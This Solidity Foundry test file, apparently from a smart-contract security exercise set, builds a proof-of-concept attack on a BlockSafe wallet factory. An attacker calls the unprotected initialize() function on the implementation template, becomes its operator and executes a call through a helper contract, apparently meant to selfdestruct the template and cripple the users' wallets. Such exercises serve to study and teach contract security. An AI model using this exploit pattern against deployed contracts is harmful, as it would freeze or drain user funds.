pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {usdcErc20} from "src/call-attacks/call-attacks-2/ERC20.sol";
import "../../../src/call-attacks/call-attacks-4/BlockSafe.sol";
import "../../../src/call-attacks/call-attacks-4/BlockSafeFactory.sol";
import "../../../src/call-attacks/call-attacks-4/IBlockSafe.sol";
import "../../../src/call-attacks/call-attacks-4/ThisIsNothing.sol";

contract Call41Test is Test {
    BlockSafe blockSafeTemplate;
    BlockSafeFactory blockSafeFactory;
    usdcErc20 usdc;
    ThisIsNothing thisIsNothing;
    // start at 100 for some safety reason
    address deployerAddress = address(100);
    address userAddress1 = address(101); //65
    address userAddress2 = address(102); //66
    address userAddress3 = address(103); //67
    address attacker = address(104);
    // set constant price to 5 USDC; keep in mind that USDC has 6 decimals; used 18 here since our mock token has 18 decimals
    uint256 VALUE = 1 * 10 ** 18;
    uint256 SEND = 10 * 10 ** 18;
    //
    address blockSafe1;
    address blockSafe2;
    address blockSafe3;

    function setUp() public {
        // impersonate deployerAddress
        vm.startPrank(deployerAddress);
        // Setup instance of the contract(s)
        usdc = new usdcErc20();
        blockSafeTemplate = new BlockSafe();
        blockSafeFactory = new BlockSafeFactory(deployerAddress,address(blockSafeTemplate));
        vm.stopPrank();
        // deal ether to EOAs
        deal(deployerAddress, 20 ether);
        deal(userAddress1, 20 ether);
        deal(userAddress2, 20 ether);
        deal(userAddress3, 20 ether);
        deal(attacker, 20 ether);
    }

    function testATTACK() public {
        // user creating a crypto keeper
        vm.startPrank(userAddress1);
        // create user1Salt taking keccak256 of userAddress
        bytes32 user1Salt = keccak256(abi.encodePacked(userAddress1));
        address blockSafe1Address = blockSafeFactory.predictBlockSafeAddress(user1Salt);
        address[] memory operators = new address[](1);
        operators[0] = userAddress1;
        address cryptKeeper1AddressCreated = blockSafeFactory.createBlockSafe(user1Salt, operators);
        payable(blockSafe1Address).call{value: 10 ether}("");
        vm.stopPrank();
        // check if the address of the created crypto keeper is the same as the predicted one
        assertEq(cryptKeeper1AddressCreated, blockSafe1Address);
        blockSafe1 = cryptKeeper1AddressCreated;
        // validate that the balance of the crypto keeper is 10 ether from our EOA
        assertEq(blockSafe1Address.balance, 10 ether);
        vm.startPrank(userAddress1);
        IBlockSafe(blockSafe1Address).executeWithValue{value: VALUE}(userAddress1, "0x", VALUE);
        vm.stopPrank();

        vm.startPrank(userAddress2);
        bytes32 user2Salt = keccak256(abi.encodePacked(userAddress2));
        address blockSafe2Address = blockSafeFactory.predictBlockSafeAddress(user2Salt);
        address[] memory operators2 = new address[](1);
        operators2[0] = userAddress2;
        address cryptKeeper2AddressCreated = blockSafeFactory.createBlockSafe(user2Salt, operators2);
        payable(cryptKeeper2AddressCreated).call{value: 10 ether}("");
        vm.stopPrank();
        assertEq(cryptKeeper2AddressCreated, blockSafe2Address);
        blockSafe2 = blockSafe2Address;
        assertEq(blockSafe2Address.balance, 10 ether);

        vm.startPrank(userAddress3);
        bytes32 user3Salt = keccak256(abi.encodePacked(userAddress3));
        address blockSafe3Address = blockSafeFactory.predictBlockSafeAddress(user3Salt);
        address[] memory operators3 = new address[](1);
        operators3[0] = userAddress3;
        address cryptKeeper3AddressCreated = blockSafeFactory.createBlockSafe(user3Salt, operators3);
        payable(blockSafe3Address).call{value: 10 ether}("");
        vm.stopPrank();
        assertEq(cryptKeeper3AddressCreated, blockSafe3Address);
        blockSafe3 = blockSafe3Address;
        assertEq(blockSafe3Address.balance, 10 ether);

        emit log_named_uint("blockSafe1Address.balance before attack", payable(blockSafe1).balance);
        emit log_named_uint("blockSafe2Address.balance before attack", payable(blockSafe2).balance);
        emit log_named_uint("blockSafe3Address.balance before attack", payable(blockSafe3).balance);
        // logic to steal ether since initialize function is not protected
        vm.startPrank(attacker);
        address[] memory operatorsAttck = new address[](1);
        operatorsAttck[0] = attacker;
        IBlockSafe(address(blockSafeTemplate)).initialize(operatorsAttck);
        // launch thisIsNothing contract
        thisIsNothing = new ThisIsNothing();
        // call executeWithValue on the template, with the opcode for selfdestruct
        IBlockSafe(address(blockSafeTemplate)).execute(address(thisIsNothing), "0x", 2);
        vm.stopPrank();
        // // check attack worked
        vm.startPrank(userAddress1);
        uint256 user1Balance = payable(blockSafe1).balance;
        IBlockSafe(blockSafe1).executeWithValue(userAddress1, "0x", SEND);
        vm.stopPrank();
        vm.startPrank(userAddress2);
        uint256 user2Balance = payable(blockSafe2).balance;
        IBlockSafe(blockSafe2).executeWithValue(userAddress2, "0x", SEND);
        vm.stopPrank();
        vm.startPrank(userAddress3);
        uint256 user3Balance = payable(blockSafe3).balance;
        IBlockSafe(blockSafe3).executeWithValue(userAddress3, "0x", SEND);
        vm.stopPrank();
        // assertEq(blockSafe1.balance, user1Balance);
        emit log_named_uint("blockSafe1Address.balance after attack", payable(blockSafe1).balance);
        // assertEq(blockSafe2.balance, 0 ether);
        emit log_named_uint("blockSafe2Address.balance after attack", payable(blockSafe2).balance);
        // assertEq(blockSafe3.balance, 0 ether);
        emit log_named_uint("blockSafe3Address.balance after attack", payable(blockSafe3).balance);
    }
}
